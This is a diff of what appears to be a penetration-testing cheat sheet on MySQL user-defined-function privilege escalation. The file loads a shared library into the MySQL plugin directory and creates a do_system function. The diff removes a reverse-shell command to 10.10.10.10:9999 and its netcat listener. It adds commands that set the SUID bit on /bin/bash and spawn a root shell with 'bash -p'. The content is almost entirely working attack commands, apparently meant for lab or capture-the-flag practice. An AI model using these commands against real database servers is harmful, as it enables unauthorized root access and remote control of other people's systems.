@@ -1087,17 +1087,17 @@ mysql> create table priv(line blob);
 mysql> insert into priv values(load_file(‘/tmp/priv.so’));
 mysql> select * from priv into dumpfile ‘/usr/lib/mysql/plugin/priv.so’;
 mysql> create function do_system returns integer soname ‘priv.so’;
-mysql> select do_system(‘bash -i >& /dev/tcp/10.10.10.10/9999 0>&1’);
+mysql> select do_system(‘chmod +s /bin/bash’);
+mysql>!sh
+/bin/bash -p
+id && whoami
 
 // priv.c can be called anything
 // The "priv" table name can be named anything
 // Ensure that the path to the UDF (.so) is correct
 // Replace IP & Port
 ```
-Attacker
-```
-nc -lvnp 9999
-```
+
 
 
 
